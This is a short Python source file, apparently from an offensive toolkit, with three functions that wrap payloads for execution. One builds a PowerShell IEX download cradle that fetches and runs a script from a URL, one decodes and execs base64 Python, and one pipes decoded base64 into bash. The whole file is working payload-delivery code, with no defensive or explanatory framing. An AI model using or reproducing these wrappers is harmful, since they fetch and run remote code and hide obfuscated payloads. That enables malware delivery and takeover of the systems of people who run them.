def wrap_powershell_download_cradle(url: str) -> str:
    """IEX download cradle for PowerShell payloads."""
    return f"IEX((New-Object Net.WebClient).DownloadString('{url}'))"


def wrap_python_exec(payload_b64: str) -> str:
    """Python exec wrapper for encoded payloads."""
    return f"import base64;exec(base64.b64decode('{payload_b64}'))"


def wrap_bash_eval(payload_b64: str) -> str:
    """Bash eval wrapper."""
    return f'echo "{payload_b64}" | base64 -d | bash'


